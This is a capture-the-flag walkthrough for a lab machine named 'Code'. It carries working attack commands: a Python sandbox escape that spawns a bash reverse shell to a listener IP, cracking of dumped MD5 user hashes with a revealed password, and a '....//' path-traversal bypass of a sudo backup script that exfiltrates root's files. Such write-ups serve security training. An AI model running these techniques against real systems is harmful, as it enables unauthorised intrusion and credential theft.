# 💻 Code 

## 📝 Overview

The machine involves escaping a restricted Python environment, **Python sandbox escape** , retrieving user credentials from a database, 
gaining SSH access, and bypassing a backup script to escalate privileges.

## 🔍 Enumeration

Nmap:
```sh
nmap -T3 10.10.11.62
nmap -sV -sC -p 22,5000 10.10.11.62
```
Access the web service in the browser:
```sh
http://10.10.11.62:5000
```

## 🐍 Exploitation: Python Sandbox Escape

List all subclasses to find Popen:
```py
print([x.__name__ for x in (0).__class__.__base__.__subclasses__()])
print((lambda:0).__class__.__base__.__subclasses__())

# find index of popen : 317
subs = (()).__class__.__bases__[0].__subclasses__()
for i, cls in enumerate(subs):
    name = cls.__name__.lower()
    if len(name) == 5 and name[0] == 'p':
        raise Exception(f"Classe trouvée: {cls.__name__} à l'index {i}")
```
Spawn reverse shell:
```py
out, err = (().__class__.__bases__[0].__subclasses__()[317])(
    ['bash', '-c', 'bash -i >& /dev/tcp/10.10.14.98/4444 0>&1'],
    stdout=-1,
    stderr=-1
).communicate()
print(out.decode())
```

## 🧑‍💻 User Enumeration
Upgrade shell:
```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
# starting exploration
id
groups
```
Find writable files:
```sh
find / -writable -type f 2>/dev/null | grep -Ev '^/proc|^/sys'
```
## 🔑 Extracting Passwords

Extracted hashes from the database:
```sh
cd instance
sqlite3 database.db
. tables
select * from user;
#1|development|759b74ce43947f5f4c91aeddc3e5bad3
#2|martin|3de6f30c4a09c27fc71932bfc68474be
```
Crack hashes with John:
```sh
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
# development      (development)     
# nafeelswordsmaster (martin) 
```

## 🖥️ SSH Access

Connect to ssh:
```sh
ssh martin@10.10.11.62 
```
Explore system:
```sh
whoami
groups
sudo -l
```

## 🧗 Privilege Escalation via script

backy.sh takes a JSON config to back up directories but restricts paths to /home/ and /var/.
We can bypass this filter using directory traversal:
```sh
cat > root-steal.json << EOF
{
  "destination": "/home/martin/",
  "multiprocessing": true,
  "verbose_log": true,
  "directories_to_archive": [
    "/home/....//root/"
  ]
}
EOF
```
Run backup:
```sh
sudo /usr/bin/backy.sh root-steal.json
```
extract the backup:
```sh
tar -xvf <filename>
```
You now have access to root files and can escalate privileges.